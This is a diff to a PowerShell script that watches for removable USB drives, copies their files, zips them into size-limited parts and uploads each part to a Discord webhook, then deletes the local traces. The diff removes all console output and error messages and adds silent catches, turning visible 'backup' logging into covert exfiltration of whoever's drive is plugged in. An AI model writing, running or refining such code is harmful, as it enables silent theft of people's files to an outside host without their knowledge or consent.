@@ -9,17 +9,12 @@ $LastDriveCount = 0
 
 function Send-ToDiscord {
     param ([string]$FilePath)
-    if (-not (Test-Path $FilePath)) {
-        Write-Host "File $FilePath does not exist, skipping send."
-        return
-    }
+    if (-not (Test-Path $FilePath)) { return }
     try {
         $ZipTest = [System.IO.Compression.ZipFile]::OpenRead($FilePath)
         $ZipTest.Dispose()
-    } catch {
-        Write-Host "Zip file $FilePath is invalid, skipping send."
-        return
-    }
+    } catch { return }
+
     $Boundary = [System.Guid]::NewGuid().ToString()
     $FileName = Split-Path $FilePath -Leaf
     try {
@@ -36,10 +31,9 @@ function Send-ToDiscord {
         $MemStream.Close()
         $FileStream.Close()
         $Headers = @{"Content-Type" = "multipart/form-data; boundary=$Boundary"}
-        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -Headers $Headers
-        Write-Host "File $FileName successfully sent to Discord."
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -Headers $Headers > $null
     } catch {
-        Write-Host "Error sending $FileName to Discord: $_"
+        # Silent catch
     } finally {
         if ($MemStream) { $MemStream.Dispose() }
         if ($FileStream) { $FileStream.Dispose() }
@@ -50,10 +44,8 @@ function Send-ToDiscord {
 function Create-LimitedZip {
     param ([string]$SourceDir, [string]$ZipPrefix, [long]$MaxSize)
     $Files = Get-ChildItem -Path $SourceDir -Recurse -File | Where-Object { $VideoExtensions -notcontains $_.Extension.ToLower() }
-    if (-not $Files) {
-        Write-Host "No files to zip in $SourceDir, skipping."
-        return
-    }
+    if (-not $Files) { return }
+
     $CurrentZipSize = 0
     $ZipIndex = 1
     $CurrentZipPath = "$OutputDir\$ZipPrefix$ZipIndex.zip"
@@ -70,12 +62,8 @@ function Create-LimitedZip {
                     $ZipTest = [System.IO.Compression.ZipFile]::OpenRead($CurrentZipPath)
                     $ZipTest.Dispose()
                     Send-ToDiscord -FilePath $CurrentZipPath
-                } catch {
-                    Write-Host "Zip file $CurrentZipPath is invalid, skipping."
-                }
-                if (Test-Path $CurrentZipPath) {
-                    Remove-Item $CurrentZipPath -Force
-                }
+                } catch { }
+                if (Test-Path $CurrentZipPath) { Remove-Item $CurrentZipPath -Force > $null }
                 $ZipIndex++
                 $CurrentZipPath = "$OutputDir\$ZipPrefix$ZipIndex.zip"
                 $Zip = [System.IO.Compression.ZipFile]::Open($CurrentZipPath, "Create")
@@ -101,39 +89,31 @@ function Create-LimitedZip {
                 }
                 $CurrentZipSize += $FileSize
                 $EntryCount++
-            } catch {
-                Write-Host "Error adding $File to zip: $_"
-            }
+            } catch { }
         }
     } finally {
         if ($Zip) { $Zip.Dispose() }
     }
+
     if ($EntryCount -gt 0) {
         try {
             $ZipTest = [System.IO.Compression.ZipFile]::OpenRead($CurrentZipPath)
             $ZipTest.Dispose()
             Send-ToDiscord -FilePath $CurrentZipPath
-        } catch {
-            Write-Host "Zip file $CurrentZipPath is invalid, skipping."
-        }
-        if (Test-Path $CurrentZipPath) {
-            Remove-Item $CurrentZipPath -Force
-        }
+        } catch { }
+        if (Test-Path $CurrentZipPath) { Remove-Item $CurrentZipPath -Force > $null }
     } else {
-        if (Test-Path $CurrentZipPath) {
-            Remove-Item $CurrentZipPath -Force
-        }
+        if (Test-Path $CurrentZipPath) { Remove-Item $CurrentZipPath -Force > $null }
     }
 }
 
 if (-not (Test-Path $OutputDir)) {
-    New-Item -Path $OutputDir -ItemType Directory
+    New-Item -Path $OutputDir -ItemType Directory > $null
 }
 if (-not (Test-Path $TempDir)) {
-    New-Item -Path $TempDir -ItemType Directory
+    New-Item -Path $TempDir -ItemType Directory > $null
 }
 
-Write-Host "Waiting for USB device..."
 while ($true) {
     $Drives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
     $CurrentDriveCount = $Drives.Count
@@ -148,21 +128,18 @@ while ($true) {
             $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
             $ZipPrefix = "${DriveName}_${Timestamp}_part"
             $SourcePath = "$DriveLetter\"
-            Write-Host "Detected USB: $DriveLetter ($DriveName). Starting backup..."
             $TempDriveDir = "$TempDir\$DriveName"
             if (Test-Path $TempDriveDir) {
-                Remove-Item -Path $TempDriveDir -Recurse -Force
+                Remove-Item -Path $TempDriveDir -Recurse -Force > $null
             }
-            New-Item -Path $TempDriveDir -ItemType Directory
+            New-Item -Path $TempDriveDir -ItemType Directory > $null
             try {
                 Copy-Item -Path "$SourcePath\*" -Destination $TempDriveDir -Recurse -Exclude $VideoExtensions -ErrorAction Stop
             } catch {
-                Write-Host "Error copying files from ${SourcePath}: $_"
                 continue
             }
             Create-LimitedZip -SourceDir $TempDriveDir -ZipPrefix $ZipPrefix -MaxSize $MaxZipSize
-            Remove-Item -Path $TempDriveDir -Recurse -Force
-            Write-Host "Backup for $DriveLetter completed."
+            Remove-Item -Path $TempDriveDir -Recurse -Force > $null
             $ProcessedDrives[$Serial] = 1
         }
     }
